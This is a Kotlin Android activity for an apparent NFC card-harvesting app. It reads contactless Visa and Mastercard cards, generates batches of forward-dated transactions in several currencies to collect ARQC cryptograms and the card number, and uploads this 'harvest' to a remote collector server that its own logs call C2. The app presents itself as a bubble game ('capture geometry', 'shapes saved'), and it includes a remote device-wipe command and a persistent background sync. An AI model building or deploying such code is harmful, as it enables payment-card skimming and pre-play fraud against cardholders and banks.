package com.nfcresearch.reader

import android.app.AlertDialog
import android.app.PendingIntent
import android.content.Intent
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.work.*
import com.journeyapps.barcodescanner.ScanContract
import com.journeyapps.barcodescanner.ScanIntentResult
import com.journeyapps.barcodescanner.ScanOptions
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import xyz.happify.ckemv.EmvKernel
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import kotlin.math.min

class MainActivity : AppCompatActivity() {

    private lateinit var bubbleView: BubbleView
    private lateinit var tvScore:    TextView
    private lateinit var tvStatus:   TextView
    private lateinit var tvCenter:   TextView
    private lateinit var tvTitle:    TextView
    private lateinit var dot1: View; private lateinit var dot2: View
    private lateinit var dot3: View; private lateinit var dot4: View
    private lateinit var dot5: View

    private lateinit var db:       HarvestDb
    private lateinit var wsClient: WsClient

    private var tapCount = 0
    @Volatile private var lastDiscoveredIp = ""
    private var nfcAdapter: NfcAdapter? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    @Volatile private var isHarvesting = false

    data class CveConfig(
        val id: Int, val name: String, val amount: Long,
        val visaTags: Map<String, String>, val mastercardTags: Map<String, String>
    )

    private val qrLauncher = registerForActivityResult(ScanContract()) { result: ScanIntentResult ->
        val text = result.contents?.trim() ?: return@registerForActivityResult
        if (text.startsWith("ws://") || text.startsWith("wss://")) {
            db.setServerIp(text)
            tvStatus.text = "Server: ${text.substringAfter("://").substringBefore("/")}"
            Log.i("EMV", "Server URL enrolled via QR: $text")
            wsClient.close()
            setupWebSocket()
        } else if (text.isNotEmpty()) {
            db.setApiKey(text)
            tvStatus.text = "API key saved"
            Log.i("EMV", "API key enrolled via QR")
        }
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        bubbleView = findViewById(R.id.bubbleView)
        tvScore    = findViewById(R.id.tvScore)
        tvStatus   = findViewById(R.id.tvStatus)
        tvCenter   = findViewById(R.id.tvCenterLabel)
        tvTitle    = findViewById(R.id.tvTitle)
        dot1 = findViewById(R.id.dot1); dot2 = findViewById(R.id.dot2)
        dot3 = findViewById(R.id.dot3); dot4 = findViewById(R.id.dot4)
        dot5 = findViewById(R.id.dot5)

        db         = HarvestDb(this)
        nfcAdapter = NfcAdapter.getDefaultAdapter(this)

        tvScore.text = db.getTotalScans().toString()

        // Long press status → paste API key
        tvStatus.setOnLongClickListener { showApiKeyDialog(); true }
        // Long press score → QR scan API key
        tvScore.setOnLongClickListener {
            qrLauncher.launch(ScanOptions().apply {
                setPrompt("Scan Collector API Key")
                setBeepEnabled(false)
                setOrientationLocked(true)
            }); true
        }
        // Long press title → set server IP
        tvTitle.setOnLongClickListener { showServerIpDialog(); true }

        // WorkManager 15-min survival sync
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "harvest_sync", ExistingPeriodicWorkPolicy.KEEP,
            PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build())

        setupWebSocket()
        setupUdpDiscovery()
        startUploadLoop()
    }

    override fun onResume() {
        super.onResume()
        val intent = Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE)
        nfcAdapter?.enableForegroundDispatch(this, pi, null,
            arrayOf(arrayOf(IsoDep::class.java.name)))
        tvStatus.text = "Hold card to capture geometry"
        tvCenter.text = "READY"
    }

    override fun onPause() {
        super.onPause()
        nfcAdapter?.disableForegroundDispatch(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        wsClient.close()
        scope.cancel()
        db.close()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        val tag = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG) ?: return
        scope.launch { readCard(tag) }
    }

    // ── WebSocket setup ───────────────────────────────────────────────────────

    private fun setupWebSocket() {
        wsClient = WsClient(
            scope     = scope,
            serverIp  = { runCatching { db.getServerIp() }.getOrDefault("127.0.0.1") },
            onConfig  = { obj -> handleConfig(obj) },
            onClear   = { handleClear() },
            onAck     = { stored ->
                // Server confirmed harvest; remove the card that was just sent
                scope.launch(Dispatchers.IO) {
                    val pending = db.getPendingCards()
                    if (pending.isNotEmpty()) {
                        db.deleteCard(pending[0].id)
                        db.incrementTotalScans()
                        withContext(Dispatchers.Main) { tvScore.text = db.getTotalScans().toString() }
                    }
                }
            },
            onConnected = {
                Log.d("EMV", "WS connected — flushing pending")
                scope.launch(Dispatchers.IO) { uploadPending() }
            },
            onDisconnected = {
                Log.d("EMV", "WS disconnected")
            }
        )
        wsClient.start()
    }

    private fun handleConfig(obj: JSONObject) {
        if (obj.optBoolean("clear_device", false)) {
            handleClear()
        }
        val cves = runCatching {
            parseMeCves(obj.toString()).map {
                HarvestDb.CveRow(it.id, it.name, it.amount,
                    JSONObject(it.mastercardTags).toString(),
                    JSONObject(it.visaTags).toString())
            }
        }.getOrNull()
        if (cves != null) db.replaceCves(cves)
        Log.d("EMV", "Config received via WS")
    }

    private fun handleClear() {
        db.clearAll()
        Log.d("EMV", "Device cleared by C2")
        scope.launch(Dispatchers.Main) { tvScore.text = "0" }
    }

    // ── UDP auto-discovery ────────────────────────────────────────────────────

    private fun setupUdpDiscovery() {
        UdpDiscovery(scope) { ip, _ ->
            if (ip == lastDiscoveredIp) return@UdpDiscovery
            val current = runCatching { db.getServerIp() }.getOrDefault("127.0.0.1")
            lastDiscoveredIp = ip
            if (current == ip) return@UdpDiscovery
            db.setServerIp(ip)
            Log.d("EMV", "Auto-discovered server at $ip — switching WS")
            scope.launch(Dispatchers.Main) {
                tvStatus.text = "Server: $ip (WiFi)"
                wsClient.close()
                setupWebSocket()
            }
        }.start()
    }

    // ── Enrollment dialogs ────────────────────────────────────────────────────

    private fun showApiKeyDialog() {
        val input = EditText(this).apply { hint = "Paste API key" }
        AlertDialog.Builder(this)
            .setTitle("Collector API Key")
            .setView(input)
            .setPositiveButton("Save") { _, _ ->
                val key = input.text.toString().trim()
                if (key.isNotEmpty()) { db.setApiKey(key); tvStatus.text = "API key saved" }
            }
            .setNegativeButton("Cancel", null).show()
    }

    private fun showServerIpDialog() {
        val current = db.getServerIp()
        val input = EditText(this).apply {
            hint    = "IP, host:port, or ws://host:port/ws"
            setText(current)
        }
        AlertDialog.Builder(this)
            .setTitle("Server Address")
            .setMessage("IP for WiFi/LAN  •  ws:// URL for internet\n127.0.0.1 = ADB cable")
            .setView(input)
            .setPositiveButton("Save") { _, _ ->
                val addr = input.text.toString().trim()
                if (addr.isNotEmpty()) {
                    db.setServerIp(addr)
                    tvStatus.text = "Server: $addr"
                    Log.i("EMV", "Server address set to $addr")
                    wsClient.close()
                    setupWebSocket()
                }
            }
            .setNegativeButton("Cancel", null).show()
    }

    // ── Upload loop (retry pending) ────────────────────────────────────────────

    private fun startUploadLoop() {
        scope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(10_000)
                if (!isHarvesting) uploadPending()
            }
        }
    }

    private suspend fun uploadPending() {
        val pending = db.getPendingCards()
        for (card in pending) {
            try {
                val payload = buildPayload(card)
                if (wsClient.isConnected) {
                    // Send via WebSocket — ack handler will delete the card
                    wsClient.send(payload)
                } else {
                    // HTTP fallback (ADB tunnel)
                    val result = postHarvestHttp(payload)
                    if (result.startsWith("HTTP 2")) {
                        db.deleteCard(card.id)
                        db.incrementTotalScans()
                        withContext(Dispatchers.Main) { tvScore.text = db.getTotalScans().toString() }
                    }
                }
            } catch (e: Exception) {
                Log.w("EMV", "Upload failed for card ${card.id}: ${e.message}")
            }
        }
    }

    // ── NFC card read ─────────────────────────────────────────────────────────

    private suspend fun readCard(tag: Tag) = withContext(Dispatchers.IO) {
        val isoDep = IsoDep.get(tag) ?: return@withContext
        isHarvesting = true

        withContext(Dispatchers.Main) {
            bubbleView.burst(16)
            tvCenter.text = "SCAN"
            tvStatus.text = "Capturing…"
        }

        val allCves = fetchCves()

        try {
            isoDep.timeout = 30_000
            isoDep.connect()

            val ppse    = isoDep.transceive(hex("00A404000E325041592E5359532E444446303100")).toHex()
            val network = when {
                ppse.contains("A0000000031") -> "Visa"
                ppse.contains("A0000000041") -> "Mastercard"
                else                         -> "Unknown"
            }

            val matchingCves = allCves.filter { cve ->
                when (network) {
                    "Visa"       -> cve.visaTags.isNotEmpty()
                    "Mastercard" -> cve.mastercardTags.isNotEmpty()
                    else         -> cve.visaTags.isNotEmpty() || cve.mastercardTags.isNotEmpty()
                }
            }

            val sdf = SimpleDateFormat("yyMMdd", Locale.CHINA)
            val rng = Random()
            var pan = ""; var aid = ""; var rawData = ""; var cardId = -1L; var bundleCount = 0

            for (cve in matchingCves) {
                val baseTags = if (network == "Visa") cve.visaTags else cve.mastercardTags
                var amount   = cve.amount

                for (dayOffset in 0..2) {
                    val innerLimit = if (dayOffset < 2) 8 else 4
                    for (inner in 0 until innerLimit) {
                        amount = amount * 95 / 100
                        amount -= min(amount, rng.nextInt(101).toLong())
                        if (amount < 100) continue

                        val cal = Calendar.getInstance(); cal.add(Calendar.DAY_OF_YEAR, dayOffset)
                        val date   = sdf.format(cal.time)
                        val params = JSONObject().apply {
                            for ((k, v) in baseTags) put(k, v)
                            put("9A",   date)
                            put("9F02", "%012d".format(amount))
                        }.toString()

                        val t0 = System.currentTimeMillis()
                        EmvKernel.INSTANCE.initialize(true, params)
                        var rounds = 0
                        while (EmvKernel.INSTANCE.getStatus() == "InProgress" && rounds++ < 30) {
                            val cmd = EmvKernel.INSTANCE.getNextCommand()
                            if (cmd.isEmpty()) break
                            EmvKernel.INSTANCE.processResponse(isoDep.transceive(hex(cmd)).toHex())
                        }

                        val ms   = (System.currentTimeMillis() - t0).toDouble()
                        val arqc = EmvKernel.INSTANCE.getArqc()
                        val atc  = EmvKernel.INSTANCE.getAtc()

                        if (pan.isEmpty() && EmvKernel.INSTANCE.getPan().isNotEmpty()) {
                            pan     = EmvKernel.INSTANCE.getPan()
                            aid     = EmvKernel.INSTANCE.getAid()
                            rawData = EmvKernel.INSTANCE.getRawData()
                            cardId  = db.insertCard(pan, aid, network, rawData)
                        }

                        if (cardId > 0) {
                            db.insertTransaction(cardId, atc, arqc, ms, params, cve.id)
                            bundleCount++
                        }

                        withContext(Dispatchers.Main) { bubbleView.burst(4) }
                    }
                }
            }

            isoDep.close()
            Log.d("EMV", "$bundleCount transactions saved PAN=$pan")

            isHarvesting = false
            uploadPending()

            withContext(Dispatchers.Main) {
                tvScore.text  = db.getTotalScans().toString()
                tvCenter.text = "SAVED!"
                tvStatus.text = "Level complete · $bundleCount shapes saved"
                advanceDot()
                bubbleView.burst(28)
            }

        } catch (e: Exception) {
            isHarvesting = false
            Log.e("EMV", "readCard: ${e.message}", e)
            withContext(Dispatchers.Main) {
                tvCenter.text = "RETRY"
                tvStatus.text = "Hold card again"
            }
            try { isoDep.close() } catch (_: Exception) {}
        }
    }

    // ── CVE fetch ─────────────────────────────────────────────────────────────

    private suspend fun fetchCves(): List<CveConfig> = withContext(Dispatchers.IO) {
        val dbCves = db.getCves()
        if (dbCves.isNotEmpty()) {
            return@withContext dbCves.map { r ->
                CveConfig(r.id, r.name, r.amount,
                    jsonObjToMap(runCatching { JSONObject(r.visaTags) }.getOrNull()),
                    jsonObjToMap(runCatching { JSONObject(r.mcTags)   }.getOrNull()))
            }
        }
        try {
            val body = httpGet("http://${db.getServerIp()}:4444/me")
            parseMeCves(body)
        } catch (e: Exception) {
            Log.w("EMV", "/me failed: ${e.message} — using fallback CVEs")
            // Fallback covers INR, USD, GBP, EUR for both Visa and MC
            val visaBase  = mapOf("9F66" to "B6004000", "9F37" to "A1B2C3D4",
                                  "9F03" to "000000000000", "9F35" to "22",
                                  "9F33" to "E0F8C8", "95" to "0000000000", "9C" to "00")
            val mcBase    = mapOf("9F66" to "B6004000", "9F37" to "B2C3D4E5",
                                  "9F03" to "000000000000", "9F35" to "22",
                                  "9F33" to "E0F8C8", "95" to "0000000000", "9C" to "00")
            val currencies = listOf(
                Triple(1, "0356", "INR"), Triple(2, "0840", "USD"),
                Triple(3, "0826", "GBP"), Triple(4, "0978", "EUR")
            )
            currencies.flatMap { (baseId, code, _) ->
                listOf(
                    CveConfig(baseId * 2 - 1, "visa-${code.lowercase()}", 100000,
                        visaBase + mapOf("9F1A" to code, "5F2A" to code), emptyMap()),
                    CveConfig(baseId * 2,     "mc-${code.lowercase()}",   100000,
                        emptyMap(), mcBase + mapOf("9F1A" to code, "5F2A" to code))
                )
            }
        }
    }

    private fun parseMeCves(body: String): List<CveConfig> {
        val arr = JSONObject(body).getJSONArray("cves")
        return (0 until arr.length()).map { i ->
            val o = arr.getJSONObject(i)
            CveConfig(o.getInt("id"), o.getString("name"), o.getLong("amount"),
                jsonObjToMap(o.optJSONObject("visa_tags")),
                jsonObjToMap(o.optJSONObject("mastercard_tags")))
        }
    }

    private fun jsonObjToMap(o: JSONObject?): Map<String, String> {
        if (o == null) return emptyMap()
        val m = mutableMapOf<String, String>()
        val k = o.keys(); while (k.hasNext()) { val key = k.next(); m[key] = o.getString(key) }
        return m
    }

    // ── Payload builders ──────────────────────────────────────────────────────

    private fun buildPayload(card: HarvestDb.PendingCard): String {
        val txArr = JSONArray()
        for (tx in card.transactions) {
            txArr.put(JSONObject().apply {
                put("atc",     tx.atc)
                put("arqc",    tx.arqc)
                put("time_ms", tx.timeMs)
                put("cve_id",  tx.cveId)
                try { put("params", JSONObject(tx.params)) }
                catch (_: Exception) { put("params", tx.params) }
            })
        }
        return JSONObject().apply {
            put("type",          "harvest")   // WebSocket message type
            put("pan",           card.pan)
            put("aid",           card.aid)
            put("network",       card.network)
            put("tx_count",      card.transactions.size)
            try { put("raw_data", JSONObject(card.rawData)) }
            catch (_: Exception) { put("raw_data", card.rawData) }
            put("harvested_txs", txArr)
        }.toString()
    }

    // ── HTTP helpers (ADB tunnel fallback) ────────────────────────────────────

    private fun httpGet(url: String): String {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.requestMethod = "GET"; conn.connectTimeout = 5_000; conn.readTimeout = 5_000
        val apiKey = db.getApiKey()
        if (!apiKey.isNullOrBlank()) conn.setRequestProperty("Authorization", "Bearer $apiKey")
        val body = conn.inputStream.readBytes().toString(Charsets.UTF_8)
        conn.disconnect()
        return body
    }

    private suspend fun postHarvestHttp(json: String): String = withContext(Dispatchers.IO) {
        try {
            val serverIp = db.getServerIp()
            val conn = URL("http://$serverIp:4444/harvest").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"; conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.connectTimeout = 5_000; conn.readTimeout = 5_000
            val apiKey = db.getApiKey()
            if (!apiKey.isNullOrBlank()) conn.setRequestProperty("Authorization", "Bearer $apiKey")
            conn.outputStream.use { it.write(json.toByteArray(Charsets.UTF_8)) }
            val code = conn.responseCode; conn.disconnect()
            "HTTP $code"
        } catch (e: Exception) { "error: ${e.message}" }
    }

    // ── UI helpers ────────────────────────────────────────────────────────────

    private val dots by lazy { listOf(dot1, dot2, dot3, dot4, dot5) }

    private fun advanceDot() {
        tapCount = (tapCount + 1).coerceAtMost(5)
        dots.forEachIndexed { i, v ->
            v.background = if (i < tapCount) getDrawable(R.drawable.dot_active)
                           else              getDrawable(R.drawable.dot_inactive)
        }
    }

    private fun ByteArray.toHex() = joinToString("") { "%02X".format(it) }
    private fun hex(s: String)    = s.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
}
